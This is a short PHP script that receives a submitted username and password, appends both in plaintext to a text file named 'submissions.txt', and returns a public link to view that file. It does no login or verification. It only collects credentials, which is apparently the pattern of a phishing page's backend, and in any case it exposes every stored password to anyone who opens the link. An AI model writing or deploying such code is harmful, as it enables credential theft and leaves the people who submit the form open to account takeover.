<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the form data
    $username = htmlspecialchars($_POST['username']);
    $password = htmlspecialchars($_POST['password']);

    // Create or open the file to store data
    $file = 'submissions.txt';

    // Format the data to save
    $data = "Username: $username | Password: $password\n";

    // Save the data to the file
    if (file_put_contents($file, $data, FILE_APPEND)) {
        echo "Data saved successfully! <a href='submissions.txt' target='_blank'>View Submissions</a>";
    } else {
        echo "Failed to save data.";
    }
} else {
    echo "Invalid request.";
}
?>